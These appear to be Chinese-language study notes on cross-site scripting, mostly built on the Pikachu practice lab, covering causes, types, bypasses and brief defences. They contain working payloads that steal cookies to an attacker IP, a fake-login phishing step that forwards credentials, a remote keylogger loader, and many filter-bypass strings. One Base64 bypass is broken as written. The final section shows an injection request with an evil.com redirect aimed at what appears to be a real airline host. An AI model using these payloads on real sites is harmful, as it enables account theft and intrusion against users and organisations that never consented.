# 基础内容

## 一、产生原因

​		跨站脚本注入漏洞是由于WEB服务器读取了用户可控数据输出到HTML页面的过程中没有进行安全处理导致的，用户可控数据包括url、参数、HTTP头部字段（cookie、referer、HOST等）、HTTP请求正文等。

## 二、分类

1，反射型XSS：攻击者输入可控数据到HTML页面中（通常是url），所以输入的数据没有被存储，只能在单次请求中生效。

2，存储型XSS：攻击者输入可控数据到HTML页面（通常是POST表单：评论、留言板、登录框等），所以输入的数据会被存储到数据库中，由于数据经过存储，可以持续被读取出来，攻击的次数比反射型XSS多。

3，DOM-XSS：攻击者可控数据通过JavaScript和DOM技术输出到HTML中，其实是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。

## 三、危害

### 1,劫持客户的cookie

> hack：10.0.0.206
>
> server：10.0.0.201

```bash
<?php
......

    if(isset($_GET['cookie'])){
        $time=date('Y-m-d g:i:s');
        $ipaddress=getenv ('REMOTE_ADDR');
        $cookie=$_GET['cookie'];
        $referer=$_SERVER['HTTP_REFERER'];
        $useragent=$_SERVER['HTTP_USER_AGENT'];
        $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
        values('$time','$ipaddress','$cookie','$referer','$useragent')";
        $result=mysqli_query($link, $query);
    }
	// 
    header("Location:http://10.0.0.201:90/pikachu/index.php");
?>
```

```bash
## php5.2.17无法实现

666...'"><script>document.location="http://10.0.0.206:90/pikachu/pkxss/xcookie/cookie.php?cookie=" + document.cookie;console.log(123456)</script>
```

### 2,钓鱼

> 获取用户名、密码信息

```bash
# 让浏览器执行认证
header("WWW-Authenticate: Basic realm='认证'");

# 修改fish.php
header("Location: http://10.0.0.206:90/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
    &password={$_SERVER[PHP_AUTH_PW]}");

留言板...'"><script src="http://10.0.0.206:90/pikachu/pkxss/xfish/fish.php"><script>
```

### 3,键盘记录（比较难）-跨域

开启允许跨域

```bash
header("Access-Control-Allow-Origin:*");

# 修改js代码
...
ajax.open("POST", "http://10.0.0.206:90/pikachu/pkxss/rkeypress/rkserver.php",true);
...
```

脚本注入

```bash
123'"><script src="http://10.0.0.206:90/pikachu/pkxss/rkeypress/rk.js"></script>
```

## 四、绕过方式

### 1,大小写绕过

```bash
<sCRipt>alert(123)</sCRipt>
```

### 2,换函数标签

```bash
javascript:alert(123456)

123'"><img src=# onerror=alert(1111)>

123'"><img src=# onerror=confirm(1111)>
123'"><img src=# onerror=prompt(1111)>
```

### 3,实体化编码

```bash
123'"><img src=# onerror=alert(1111)>

123'"><img src=# onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x31;&#x31;&#x31;&#x29;>
```

### 4,Base64编码

```bash
123'"><img src=# onerror=alert(1111)>

123'"><img src=# onerror=YWxlcnQoMTExMSk=>
```

### 5,注释绕过

```bash
123'"><scr<!--注释信息-->ipt>alert(111111111)</scr<!--注释信息-->ipt>
```

### 6,双写绕过

```bash
123'"><scr<script>ipt>alert(123456)</scr</script>ipt>
```

### 7,htmlspecialchars绕过

> ENT_COMPAT   # 双引号会被编码
>
> ENT_QUOTES   # 单引号、双引号都会被编码；
>
> ENT_NOQUOTES	# 不编码引号

```bash
# 引号被编码

# 绕过失败
123%27%22><script>alert(123456)</script>
```

### 8,JS闭合绕过

```bash
<script>
	...
	$un = $_GET['un']
	...
</script>

# $un = </script><script>alert(123456)</script>
```

## 五、防御方法

```bash
1，过滤用户输入;
2，htmlspecialchars()  ENT_QUOTES   # 单引号、双引号都会被编码；
3，输出转义：实体化编码;
```

# 攻击手法

```http
GET /wework_admin/client_corp_conf?version=2&platform=ios&agency=html%3E%3Chead%3E%20%20%20%20%20%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp%3A%2F%2Fevil.com%2Fxss%22%3E%3C%2Fhead%3E HTTP/1.1
Host: ewxim.airchina.com.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
LOG-TASK-ID: mz9ym8s-Q72Mkev

## 解码
/wework_admin/client_corp_conf?version=2&platform=ios&agency=html><head>     <meta http-equiv="refresh" content="0;url=http://evil.com/xss"></head>
```

